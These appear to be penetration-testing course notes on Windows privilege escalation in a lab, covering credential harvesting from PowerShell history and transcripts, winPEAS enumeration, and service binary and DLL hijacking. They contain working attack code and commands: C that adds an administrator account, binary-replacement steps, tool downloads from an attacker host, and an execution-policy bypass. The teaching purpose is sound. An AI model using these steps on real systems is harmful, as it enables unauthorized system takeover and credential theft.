+ Most Administrators use the _Clear-History_ command to clear the PowerShell history
+ But this Cmdlet is only clearing PowerShell's own history, which can be retrieved with _Get-History_
+ Starting with PowerShell v5, v5.1, and v7, a module named _PSReadline_ is included, which is used for line-editing and command history functionality

Interestingly, Clear-History does not clear the command history recorded by PSReadline
+ Therefore, we can check if the user in our example misunderstood the Clear-History Cmdlet to clear all traces of previous commands

To retrieve the history from PSReadline, we can use **Get-PSReadlineOption** to obtain information from the PSReadline module
+ We put it in parentheses and add **HistorySavePath** prepended with a dot
+ This syntax allows us to get only one option from all available options of the module
+ Usage:
```
(Get-PSReadlineOption).HistorySavePath
```
+ Example usage and output:
```
PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
(Get-PSReadlineOption).HistorySavePath
C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Above shows us the path of the history file from PSReadline.
+ Let's display the contents of the file:
```
PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
...
$PSVersionTable
Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
cd C:\
ls
cd C:\xampp
ls
type passwords.txt
Clear-History
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
exit
Stop-Transcript
```

The output contains various highly interesting commands for us
1. First, _dave_ executed _Register-SecretVault_ with the module _SecretManagement.keepass_, which implies that the user created a new password manager database for KeePass
2. In the next line, _dave_ used _Set-Secret_ to create a secret, or entry, in the password manager with the name _Server02 Admin PW_ and password _paperEarMonitor33@_
	+ As the name suggests, these are probably credentials for another system. However, we should attempt to leverage this password for any user, service, or login on CLIENTWK220 as it may be reused by the user. For now, we'll note the password for later and continue analyzing the history
3. Next, the output shows that _dave_ used _Clear-History_ believing that the history is cleared after executing the Cmdlet
4. Finally, _dave_ used _Start-Transcript_ to start a PowerShell Transcription
	+ This command contains the path where the transcript file is stored. Before we examine it, let's also analyze the next line
	+ Before we examine it, let's also analyze the next line
5. The user executed _Enter-PSSession_ with the hostname of the local machine as argument for _-ComputerName_ and a _PSCredential_ object named _$cred_ containing the username and password for _-Credential_
	+ The commands to create the PSCredential object are not included in the history file and therefore we don't know which user and password were used for _Enter-PSSession_
	+ _PowerShell Remoting_ by default uses WinRM for Cmdlets such as Enter-PSSession. Therefore, a user needs to be in the local group _Windows Management Users_ to be a valid user for these Cmdlets. However, instead of WinRM, SSH can also be used for PowerShell remoting

Let's analyze the transcript file in **`C:\Users\Public\Transcripts\transcript01.txt`** and check if we can shed more light on the user and password in use
+ Since the PowerShell Transcription started before Enter-PSSession was entered, it may contain the plain-text credential information used to create the PSCredential object stored in the variable _`$cred`_
```
PS C:\Users\dave> type C:\Users\Public\Transcripts\transcript01.txt
type C:\Users\Public\Transcripts\transcript01.txt
**********************
Windows PowerShell transcript start
Start time: 20220623081143
Username: CLIENTWK220\dave
RunAs User: CLIENTWK220\dave
Configuration Name: 
Machine: CLIENTWK220 (Microsoft Windows NT 10.0.22000.0)
Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Process ID: 10336
PSVersion: 5.1.22000.282
...
**********************
Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
PS C:\Users\dave> Stop-Transcript
**********************
Windows PowerShell transcript end
End time: 20220623081221
**********************
```
+ Above shows that the transcript file indeed contains the commands used to create the variable _$cred_, which were missing in the history file

To create the previously discussed PSCredential object, a user first needs to create a _SecureString_ to store the password
+ Then, the user can create the PSCredential object with the username and the stored password
+ The resulting variable, containing the object, can be used as argument for _-Credential_ in commands such as Enter-PSSession

Let's copy the three highlighted commands and paste it into our bind shell:
```
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force

PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
whoami
clientwk220\daveadmin
```
+ The output shows that we could use these three commands to start a PowerShell remoting session via WinRM on CLIENTWK220 as the user _daveadmin_
+ While whoami works, other commands do not:
```
[CLIENTWK220]: PS C:\Users\daveadmin\Documents> cd C:\
cd C:\

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> pwd
pwd

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> dir
dir
```
+ Above shows that we received no output from the commands we entered
+ We should note that creating a PowerShell remoting session via WinRM in a bind shell like we used in this example can cause unexpected behavior

To avoid any issues, let's use _evil-winrm_ to connect to CLIENTWK220 via WinRM from our Kali machine instead
+ This tool provides various built-in functions for penetration testing such as pass the hash, in-memory loading, and file upload/download
+ However, we'll only use it to connect to the target system via WinRM to avoid the issues we faced by creating a PowerShell remoting session in our bind shell as shown above

We enter the IP as argument for **`-i`**, the username for **`-u`**, and the password for **-`p`**. We need to escape both `!`s in the password
+ Usage: 
```
evil-winrm -i <IP> -u <USER> -p "<PASSWORD>"
```
+ Example Usage and Output:
```
kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\daveadmin\Documents> whoami
clientwk220\daveadmin

*Evil-WinRM* PS C:\Users\daveadmin\Documents> cd C:\

*Evil-WinRM* PS C:\> dir

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          6/5/2021   5:10 AM                PerfLogs
d-r---         7/20/2022   1:14 AM                Program Files
d-r---          6/5/2021   7:37 AM                Program Files (x86)
d-----          7/4/2022   1:00 AM                tools
d-r---         6/23/2022   8:12 AM                Users
d-----         7/20/2022   8:07 AM                Windows
d-----         6/16/2022   1:17 PM                xampp
```
+ Above shows, we can now execute commands without any issues. Great!

PowerShell artifacts such as the history file of PSReadline or transcript files are often a treasure trove of valuable information
+ We should never skip reviewing them, because most Administrators clear their history with Clear-History and therefore, the PSReadline history stays untouched for us to analyze

Administrators can prevent PSReadline from recording commands by setting the _`-HistorySaveStyle`_ option to _`SaveNothing`_ with the _`Set-PSReadlineOption`_ cmdlet 
+ Alternatively, they can clear the history file manually

#### Windows Event Logs
How to search for _PowerShell Script Block Logging_:
```
Go to Event Viewer → Events from Script Block Logging are in Application and Services → Microsoft → Windows → PowerShell → Operational: Click Filter Current Log and search for 4104 events
```
+ These will often contain scripts that were run with credentials

Powershell logs by event ID:
```
Get-EventLog -LogName Application -Source <SOURCE> | Where-Object {$_.EventID -eq <EVENT_ID>} | Select-Object -Property Source, EventID, InstanceId, Message
```

Event by message:
```
Get-EventLog -LogName System -Message *<DESCRIPTION>*
```


### Automated Enumeration
In the previous three sections, we manually enumerated CLIENTWK220
+ We gathered information, which led us to two different ways to elevate our privileges
+ However, this took us quite some time to do
+ In a real-life penetration test for a client, we often have time constraints, limiting the time we can take to enumerate systems in a manual way

Therefore, we should use automated tools that enumerate the target machine and provide us results about situational awareness as well as potential sensitive information in an easy to consume fashion
+ One such tool is <mark style="background: #D2B3FFA6;">winPEAS</mark> 
+ **NOTE**: Automated tools can be blocked by AV solutions. If this is the case, we can apply techniques learned in the Module "Antivirus Evasion", try other tools such as _Seatbelt_ and _JAWS_, or do the enumeration manually

Once we have installed the package **peass** on our Kali system, we can copy the 64-bit binary of winPEAS to our home directory and start a Python3 web server to serve it
```
kali@kali:~$ cp /usr/share/peass/winpeas/winPEASx64.exe .

kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Let's connect to the bind shell running on port 4444 at CLIENTWK220 as user _dave_ as we did before
+ We start PowerShell and use the _iwr_ Cmdlet with the URL of the winPEAS binary as argument for **-Uri** and **winPeas.exe** for **-Outfile**
```
kali@kali:~$ nc 192.168.50.220 4444
Microsoft Windows [Version 10.0.22000.318]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://192.168.118.3/winPEASx64.exe -Outfile winPEAS.exe
```

Now, let's run the winPEAS program
+ It'll take a few minutes for the program to finish
+ While it is running, let's review the output legend of winPEAS
+ It categorizes results in different colors indicating items worth a deeper inspection (red) and important information about protections (green)
```
C:\Users\dave> .\winPEAS.exe
...
+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links
```

After the program is finished, let's review some of its findings. We begin with the basic system information:
```
...
����������͹ Basic System Information
...    
    Hostname: clientwk220
    ProductName: Windows 10 Pro
    EditionID: Professional
    ReleaseId: 2009
    BuildBranch: co_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 6/23/2022 2:30:36 PM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: 
...
```
+ Above shows that winPEAS detected the target machine as _Windows 10 Pro_ instead of Windows 11 as we established before
+ This shows that we should never blindly trust the output of a tool

Next, winPEAS provides information about security protections as well as PowerShell and NTLM settings
+ One of these information sections is about transcript files
```
...    
����������͹ PS default transcripts history
� Read the PS history inside these files (if any)
...
```
+ The list of transcript files is empty, but we know that one exists in **`C:\Users\Public\`**. This is another example of information we would have missed by relying on tool output alone without incorporating manual work

Next, let's scroll down to the _Users_ output section of winPEAS
```
����������͹ Users
...    
Current user: dave
Current groups: Domain Users, Everyone, helpdesk, Builtin\Remote Desktop Users, Users, Batch, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication

   CLIENTWK220\Administrator(Disabled): Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    CLIENTWK220\BackupAdmin
        |->Groups: BackupUsers,Administrators,Users
        |->Password: CanChange-NotExpi-Req

    CLIENTWK220\dave: dave
        |->Groups: helpdesk,Remote Desktop Users,Users
        |->Password: CanChange-NotExpi-Req

    CLIENTWK220\daveadmin
        |->Groups: adminteam,Administrators,Remote Management Users,Users
        |->Password: CanChange-NotExpi-Req
...

    CLIENTWK220\steve
        |->Groups: helpdesk,Remote Desktop Users,Remote Management Users,Users
        |->Password: CanChange-NotExpi-Req
...
```
+ The output lists all users and their groups in an easy to read manner
+ This way of displaying the information makes it very easy for us to understand which users exist and are members of certain groups, such as Remote Desktop Users

Scrolling down, we'll find information about processes, services, scheduled tasks, network information, and installed applications

The next area we analyze is _Looking for possible password files in users homes_
```
...    
����������͹ Looking for possible password files in users homes
...
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\dave\AppData\Local\Packages\MicrosoftTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\ZxcvbnData\3.0.0.0\passwords.txt

...
```
+ The list of files does not contain _asdf.txt_ on the Desktop of _dave_
+ Again, we would have missed this finding without any additional manual work or by using another tool

Running winPEAS on CLIENTWK220 provided us with lots of information and gave us some great situational awareness about the system
+ On the other hand, the tool incorrectly identified the target as Windows 10 and missed the meeting note, PowerShell history, and transcript file, which we used to elevate our privileges in the previous sections
+ However, because of the missing findings we should not abstain from using automated tools, but merely understand their limits

Automated tools such as winPEAS are essential in real-life penetration tests
+ Outside of lab environments, the targets often contain numerous files, configuration settings, and information to go through
+ While we have only a few files in lab environments, we'll potentially get a list of hundreds or thousands of files to search through a single system in an assessment
+ With a pending deadline for the penetration test, we would spend all of our time going through files without employing automated tools

In this section, we familiarized ourselves with winPEAS and how to use it 
+ We collected information on the target system and compared it with our manual enumeration results
+ While there were some missing findings by winPEAS, the sheer amount of information resulting from its execution demonstrates how much time we can save in order to avoid manually obtaining all this information

## Leveraging Windows Services 
A _Windows Service_ is a long-running background executable or application managed by the _Service Control Manager_ and is similar to the concept of _daemons_ on Unix systems
+ Windows services can be managed by the _Services snap-in_, PowerShell, or the _sc.exe_ command line tool
+ Windows uses the _LocalSystem_ (includes the SIDs of _NT AUTHORITY\SYSTEM_ and _BUILTIN\Administrators_ in its token), _Network Service_, and _Local Service_ user accounts to run its own services
+ Users or programs creating a service can choose either one of those accounts, a domain user, or a local user
+ Windows services are one of the main areas to analyze when searching for privilege escalation vectors

### Service Binary Hijacking
Each Windows service has an associated binary file
+ These binary files are executed when the service is started or transitioned into a running state

For this section, let's consider a scenario in which a software developer creates a program and installs an application as a Windows service
+ During the installation, the developer does not secure the permissions of the program, allowing full Read and Write access to all members of the Users group
+ As a result, a lower-privileged user could replace the program with a malicious one
+ To execute the replaced binary, the user can restart the service or, in case the service is configured to start automatically, reboot the machine
+ Once the service is restarted, the malicious binary will be executed with the privileges of the service, such as _LocalSystem_

We begin by connecting to CLIENTWK220 as _dave_ over RDP with the password _`qwertqwertqwert123`_
+ For the purpose of this example, let's assume the vectors to elevate our privileges from the previous Learning Unit are out of scope

To get a list of all installed Windows services, we can choose various methods such as the GUI snap-in _`services.msc`_, the _`Get-Service`_ Cmdlet, or the _`Get-CimInstance`_ Cmdlet (superseding _`Get-WmiObject`_)

Once connected, we start PowerShell and choose **`Get-CimInstance`** to query the WMI class **`win32_service`**
+ We are interested in the name, state, and path of the binaries for each service and therefore, use **Select** with the arguments **Name**, **State**, and **PathName**
+ In addition, we filter out any services that are not in a **Running** state by using **Where-Object**
+ **NOTE**: When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user
	+ Using an interactive logon such as RDP solves this problem
+ Usage:
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
+ Example output:
```
Name                      State   PathName
----                      -----   --------
Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
Appinfo                   Running C:\Windows\system32\svchost.exe -k netsvcs -p
AppXSvc                   Running C:\Windows\system32\svchost.exe -k wsappx -p
AudioEndpointBuilder      Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Audiosrv                  Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
BFE                       Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
BITS                      Running C:\Windows\System32\svchost.exe -k netsvcs -p
BrokerInfrastructure      Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
...
mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
...
```
+ The two XAMPP services _Apache2.4_ and _mysql_ stand out as the binaries are located in the **C:\xampp\** directory instead of **C:\Windows\System32**
+ This means the service is user-installed and the software developer is in charge of the directory structure as well as permissions of the software
+ These circumstances make it potentially prone to service binary hijacking

Next, let's enumerate the permissions on both service binaries
+ We can choose between the traditional _`icacls`_ Windows utility or the PowerShell Cmdlet _`Get-ACL`_ 
+ For this example, we'll use icacls since it usable both in PowerShell and the Windows command line

The icacls utility outputs the corresponding principals and their permission mask.
+ The most relevant permissions and their masks are listed below:

| MASK | PERMISSIONS             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

Let's use **icacls** on the Apache binary **httpd.exe** first:
```
PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(RX)
                              NT AUTHORITY\Authenticated Users:(RX)

Successfully processed 1 files; Failed processing 0 files
```
+ As member of the built-in _Users_ group, _dave_ only has _Read and Execute_ (RX) rights on **httpd.exe**, meaning we cannot replace the file with a malicious binary

Next, we'll check **mysqld.exe** from the mysql service:
```
PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files
```
+ Above shows that members of the _Users_ group have the Full Access (F) permission, allowing us to write to and modify the binary and therefore, replace it

Due to the missing indicator _(I)_ preceding this permission, we know that it was set on purpose and not inherited by the parent directory
+ Administrators often set Full Access permissions when they configure a service and are not entirely sure about the required permissions
+ Setting it to Full Access avoids most permission problems, but creates a security risk as we'll show in this example

Let's create a small binary on Kali, which we'll use to replace the original **mysqld.exe**
+ The following C code will create a user named _dave2_ and add that user to the local Administrators group using the _system_ function
+ The cross-compiled version of this code will serve as our malicious binary. Let's save it on Kali in a file named **adduser.c**
``` c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

Next, we'll cross-compile the code on our Kali machine with _mingw-64_ as we learned in the Module "Fixing Exploits"
+ Since we know that the target machine is 64-bit, we'll cross-compile the C code to a 64-bit application with **x86_64-w64-mingw32-gcc**
+ In addition, we use **adduser.exe** as argument for **-o** to specify the name of the compiled executable:
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

Once **adduser.exe** is cross-compiled, we can transfer it to our target and replace the original **mysqld.exe** binary with our malicious copy
+ For this, we start a Python3 web server in the output directory of **adduser.exe** on our Kali machine and use **iwr** on the target machine in a PowerShell window to download our executable file
+ In addition, we move the original **mysqld.exe** to our home directory
+ This way, we can restore the service binary after a successful privilege escalation attempt
```
PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe  

PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

In order to execute the binary through the service, we need to restart it. We can use the **net stop** command to stop the service
```
PS C:\Users\dave> net stop mysql
System error 5 has occurred.

Access is denied.
```

Unfortunately, _dave_ doesn't have sufficient permissions to stop the service
+ This is expected as most services are only managed by administrative users

Since we do not have permission to manually restart the service, we must consider another approach
+ If the service _Startup Type_ is set to "Automatic", we may be able to restart the service by rebooting the machine

Let's check the Startup Type of the mysql service with the help of the **Get-CimInstance** Cmdlet by selecting **Name** and **StartMode** as well as filter for the string "mysql" with **Where-Object**:
```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```
+ Output:
```
Name  StartMode
----  ---------
mysql Auto
```
+ Above shows that the service is set to _Auto_, meaning it will start automatically after a reboot

In order to issue a reboot, our user needs to have the privilege _SeShutDownPrivilege_ assigned
+ We can use **whoami** with **/priv** to get a list of all privileges
+ Usage:
```
whoami /priv
```
+ Output:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```
+ Above shows that our user has the privilege in question (among others) and therefore, we should be able to initiate a system shutdown or reboot
+ The _Disabled_ state only indicates if the privilege is currently enabled for the running process
+ In our case, it means that whoami has not requested and is not currently using the SeShutdownPrivilege privilege
+ If the SeShutdownPrivilege privilege was not present, we would have to wait for the victim to manually start the service, which would be much less convenient
+ We can issue a reboot with **shutdown** and the arguments **/r** (reboot instead of shutdown) and **/t 0** (in zero seconds):
```
shutdown /r /t 0
```
+ **NOTE**: We should always try to avoid issuing reboots on production systems in a real-life penetration test. A reboot could lead to unforeseeable problems and should only be issued in direct collaboration with the client's IT staff. If a system doesn't boot up after we reboot, this could disrupt our client's day-to-day business and even cause long-term downtime of the infrastructure. This is especially the case in a situation when there is no current backup available

Once the reboot is complete, we connect again as _dave_ via RDP and open a PowerShell window
+ Because of the issued reboot and the Startup type _auto_, the service should have executed the executable file we placed to replace the original mysql service binary
+ To confirm that our attack worked, let's list the members of the local _Administrators_ group with **Get-LocalGroupMember** to check if _dave2_ was created and added to it:
```
PS C:\Users\dave> Get-LocalGroupMember administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local
User        CLIENTWK220\BackupAdmin   Local
User        CLIENTWK220\dave2         Local
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\offsec        Local
```
+ Above shows that _dave2_ was created and added to the local _Administrators_ group

As in the previous sections, we can use _RunAs_ to obtain an interactive shell, and can open powershell as administrator with dave2 credentials (to get admin access)
+ In addition, we could also use _msfvenom_ to create an executable file, starting a reverse shell
+ To restore the original state of the service, we have to delete our binary **mysqld.exe**, restore the backed up original binary, and restart the system

#### PowerUp
Before we conclude this section, let's review an automated tool named _PowerUp.ps1_ and check if it detects this privilege escalation vector
+ To do so, we copy the script to _kali_'s home directory and start a Python3 web server to serve it
```
kali@kali:~$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .

kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

On the target machine, we download it as _dave_ with **iwr** in PowerShell and start **powershell** with the **ExecutionPolicy** **Bypass**
+ Otherwise, it won't be possible to run scripts as they are blocked

After we import **PowerUp.ps1**, we can use **Get-ModifiableServiceFile**
+ This function displays services the current user can modify, such as the service binary or configuration files

Import PowerUp:
```
powershell -ep bypass
. .\PowerUp.ps1
```

**Get-ModifiableServiceFile** usage and output:
```
PS C:\Users\dave> Get-ModifiableServiceFile

...

ServiceName                     : mysql
Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
CanRestart                      : False
```

The output of Get-ModifiableServiceFile shows us that PowerUp identified mysql (among others) to be vulnerable
+ In addition, it provides information about the file path, the principal (_BUILTIN\Users_ group), and if we have permissions to restart the service (False)

PowerUp also provides us an _AbuseFunction_, which is a built-in function to replace the binary and, if we have sufficient permissions, restart it 
+ The default behavior is to create a new local user called _john_ with the password _Password123!_ and add it to the local _Administrators_ group
+ Because we don't have enough permissions to restart the service, we still need to reboot the machine

However, if we use the AbuseFunction **Install-ServiceBinary** with the service name, we receive an error:
```
PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'

Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql' for service mysql not
modifiable by the current user.
At C:\Users\dave\PowerUp.ps1:2178 char:13
+             throw "Service binary '$($ServiceDetails.PathName)' for s ...
+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OperationStopped: (Service binary ...e current user.:String) [], RuntimeException
    + FullyQualifiedErrorId : Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini
   mysql' for service mysql not modifiable by the current user.
```

The output states that the service binary file is not modifiable by the current user
+ However, we already established that we have Full Access permissions on the service binary and demonstrated that we could replace the file manually

Reviewing the code of PowerUp and checking the outputs of the commands used in Get-ModifiableServiceFile, we identify that _Get-ModifiablePath_ is used to return modifiable paths for the current user
+ However, for us, it provides an empty result, leading to the above error

Let's examine this behavior in order to understand why AbuseFunction is throwing an error
+ First, we'll try the service binary path without any arguments for **Get-ModifiablePath**
+ Then, we'll add another argument to check if the function still provides the correct output. Finally, we'll use an argument with a path inside
```
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles

ModifiablePath                IdentityReference Permissions
--------------                ----------------- -----------
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Users     {WriteOwner, Delete, WriteAttributes, Synchronize...}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles

ModifiablePath     IdentityReference                Permissions
--------------     -----------------                -----------
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, WriteAttributes, Synchronize, ReadControl...}
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, GenericWrite, GenericExecute, GenericRead}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal 

PS C:\Users\dave> $ModifiableFiles
```
+ Above shows that while the service binary with or without another argument works as expected, a path as an argument creates an empty result

Because the mysql service specifies the argument **`C:\xampp\mysql\bin\my.ini`** for **defaults-file** in the service binary path displayed in Listing 40, the AbuseFunction throws an error
+ In a situation like this, we should use the result of the identified vulnerable service file and do a manual exploitation as we did in this section

Our investigation shows that we should never blindly trust or rely on the output of automated tools. However, PowerUp is a great tool to identify potential privilege escalation vectors, which can be used to automatically check if the vulnerability can be exploited
+ If this is not the case, we should do some manual analysis if the potential vector is not vulnerable or the AbuseFunction just cannot exploit it 

### Service DLL Hijacking 
Replacing the binary of a service is a very effective way to attempt privilege escalation on Windows systems
+ However, because our user doesn't often have permissions to replace these binaries, we'll need to adapt with a more advanced way of abusing Windows services

_Dynamic Link Libraries_ (DLL) provide functionality to programs or the Windows operating system
+ DLLs contain code or resources, such as icon files, for other executable files or objects to use
+ These libraries provide a way for developers to use and integrate already existing functionality without reinventing the wheel
+ Windows uses DLLs to store functionality needed by several components
+ Otherwise, each component would need the functionality in their own source code resulting in a huge resource waste
+ On Unix systems, these files are called _Shared Objects_

There are several methods we can use to exploit how DLLs work on Windows and they can often be an effective way of elevating our privileges
+ One method is similar to the privilege escalation vector performed in the previous section
+ Instead of overwriting the binary, we merely **overwrite a DLL the service binary** uses
+ However, the service may not work as expected because the actual DLL functionality is missing
+ In most cases, this would still lead us to code execution of the DLL's code and then, for example, to the creation of a new local administrative user

Another method is to hijack the _DLL search order_
+ The search order is defined by Microsoft and determines what to inspect first when searching for DLLs. 
+ By default, all current Windows versions have safe DLL search mode enabled

This setting was implemented by Microsoft due to the high number of DLL hijacking vectors and ensures that DLLs are more difficult to hijack
+ The following listing shows the standard search order taken from the Microsoft Documentation:
```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

Windows first searches the application's directory
+ Interestingly, the current directory is at position 5
+ When safe DLL search mode is disabled, the current directory is searched at position 2 after the application's directory

A special case of this method is a missing DLL
+ This means the binary attempted to load a DLL that doesn't exist on the system
+ This often occurs with flawed installation processes or after updates
+ However, even with a missing DLL, the program may still work with restricted functionality

To exploit this situation, we can try placing a malicious DLL (with the name of the missing DLL) in a path of the DLL search order so it executes when the binary is started
+ Let's show how we can abuse a missing DLL in an example by connecting to `CLIENTWK220` with RDP as _`steve`_ and password _`securityIsNotAnOption++++++`_
+ We'll start PowerShell and enumerate the services as we did in the previous section
+ One finding we skipped is the service _BetaService_
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
+ Output:
```

Name                      State   PathName
----                      -----   --------
...
BetaService               Running C:\Users\steve\Documents\BetaServ.exe
...
```

Let's check our permissions on the binary file of the service
```
PS C:\Users\steve> icacls .\Documents\BetaServ.exe
.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
                         BUILTIN\Administrators:(F)
                         CLIENTWK220\steve:(RX)
                         CLIENTWK220\offsec:(F)

Successfully processed 1 files; Failed processing 0 files
```
+ Above shows that we don't have permissions to replace the binary since we only have Read and Execute permissions as _steve_, therefore, we need to investigate a bit more

We can use _Process Monitor_ to display real-time information about any process, thread, file system, or registry related activities
+ Our goal is to identify all DLLs loaded by _BetaService_ as well as detect missing ones
+ Once we have a list of DLLs used by the service binary, we can check their permissions and if they can be replaced with a malicious DLL
+ Alternatively, if find that a DLL is missing, we could try to provide our own DLL by adhering to the DLL search order

Unfortunately, we need administrative privileges to start Process Monitor and collect this data
+ However, the standard procedure in a penetration test would be to copy the service binary to a local machine
+ On this system, we can install the service locally and use Process Monitor with administrative privileges to list all DLL activity
  
In this example, we'll simulate this step by starting Process Monitor as _backupadmin_
+ We can browse in the Windows Explorer to **`C:\tools\Procmon\`** and double-click on **`Procmon64.exe`**
+ A window will appear asking us for administrative user credentials as shown in the following figure
